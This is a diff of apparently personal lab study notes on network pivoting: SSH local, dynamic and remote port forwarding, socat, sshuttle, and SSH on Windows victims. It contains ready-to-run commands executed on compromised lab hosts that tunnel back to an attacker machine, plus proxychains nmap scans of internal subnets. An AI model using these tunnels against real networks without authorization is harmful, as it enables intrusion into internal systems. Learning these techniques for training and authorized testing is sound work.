@@ -7,16 +7,23 @@ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
 # SSH local port forward
 ssh -N -L 0.0.0.0:4455:$MOST_INTERNAL_IP:$MOST_INTERNAL_PORT $middle_user@$middle_system
 ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215 # -N is to not open a shell instead just start a process
-
+# use dual homed IP (confluence) to interact with internal machine (192.168.50.63:4455)
 # SSH dynamic - proxychains
 ssh -N -D 0.0.0.0:$OPEN_NEW_PORT $username@$MIDDLE_IP
 ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+# add "socks5 192.168.50.63 9999" to proxychains.conf (confluence IP)
+# use internal machine's IP as target IP directly. (172.16.XXX.XXX)
 
 # SSH remote port forward
 ssh -N -R 127.0.0.1:5555:10.4.50.215:5432 hutgrabber@coffeetom -v
+# run commands with 127.0.0.1 as targetIP
 
 # SSH remote dynamic forwarding
+ssh -N -R 9998 hutrabber@$attack_IP # add "socks5 127.0.0.1 9998" to proxychains.conf.
 
+# sshuttle
+sshuttle -r $user@$ip_address:$port # syntax
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24 # here is where the magic happens. You can add any other subnets that the internal machine might have access to.
 ```
 # Port Forwarding & SSH Tunneling
 
@@ -122,3 +129,54 @@ ssh -N -R 127.0.0.1:5555:10.4.50.215:5432 hutgrabber@coffeetom -v
 ---
 
 ### SSH Remote Dynamic Port Forwarding
+**CAUTION** - There are two firewalls involved on two different machines that are both dual-homed. Make sure that if you connect to the second dual-homed machine, you use the internal IP and now the external one. Like in this case, `multiserver` has two IPs since it is dual homed. One in the subnet `192.168.50.0/24` & one in the internal subnet of `10.4.50.0/24`. Since all inbound packets are blocked from the external network, probing `multiserver` from it's external interface willl not yeild results.
+
+Components:
+- Using dynamic remote port forwarding with SSH, simply open a new port on the `confluence01` server. No other parameters are needed.
+- On your attack machine, make sure you configure proxychains to send traffic through the loopback address on `127.0.0.1` and also mention the newly opened port on `confluence01`.
+- Now run commands with proxychains as usual, by using the `multiserver` IP in your commands. Just be mindful that `multiserver` has two IPs based on the interface & we want to use it's `10.4.50.215` IP.
+```bash
+# on victim - confluence01
+ssh -N -R 9998 hutrabber@$attack_IP
+
+# on kali add - socks5 127.0.0.1 9998 to /etc/proxychains4.conf
+
+proxychains nmap -sT -vvv -p $any_port 10.4.50.215 -T5 -sCV # use INTERNAL IP of multiserver.
+```
+
+![[Pasted image 20240119100559.png]]
+![[Pasted image 20240119100619.png]]
+
+---
+
+## 3. Using Sshuttle  
+When nothing works, use shuttle. There are certain caveats to using this method:
+1. Requires root privs on the SSH Client 
+2. Python3 on SSH Server 
+In this module, sometimes Kali was the SSH Server (when the victim connected to the attacker), and other times - both - SSH Client & SSH Server - were victims. Like we once we used SSH to portforward into `pgdatabase` server. In that case, the client was `confluence` and server was `pgdatabse`. This makes this method less robust in gaining foothold.
+Components:
+- Just run socat and open a new port on the victim machine and also fork the process so that it creates a new process in the background using socat's syntax - `socat TCP-LISTEN:2222,fork TCP:$INTERNAL_IP:$PORT`.
+- On the attack machine, use sshuttle to connect to the dual-homed machine on the newly opened port with socat (which will forward everything to the internal machine).
+```bash
+sshuttle -r $user@$ip_address:$port # syntax
+sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24 # here is where the magic happens. You can add any other subnets that the internal machine might have access to.
+# IPs from left to right - confluence, pgdatabase, hr_shares
+```
+
+---
+
+## 4. Using ssh.exe
+Windows 10 - `Version 1803 && Version 1709` - and later - come with the OpenSSH Suite of tools (`ssh-*`) installed by default in the `%systemdrive%\Windows\System32\OpenSSH\` directory.
+Use the `where ssh` comand on windows to locate the SSH binary on the windows victim.
+Components:
+There is no magic happening here. Once we know that the Windows system has SSH, we can use any method from above to set up port forwarding on the windows system.
+```bash
+C:\Users\rdp_admin> ssh -N -D $New_Port hutgrabber@kali_IP # dynamic remote port forward.
+```
+After this, add the port to proxychains with your own loopback address as shown in the Dynamic Remote PF techniques.
+
+---
+
+## 5. Using Plink
+`plink` is the CLI version of the PuTTY client for windows. It has most of the features SSH has but one - Remote Dynamic Port Forwarding.
+
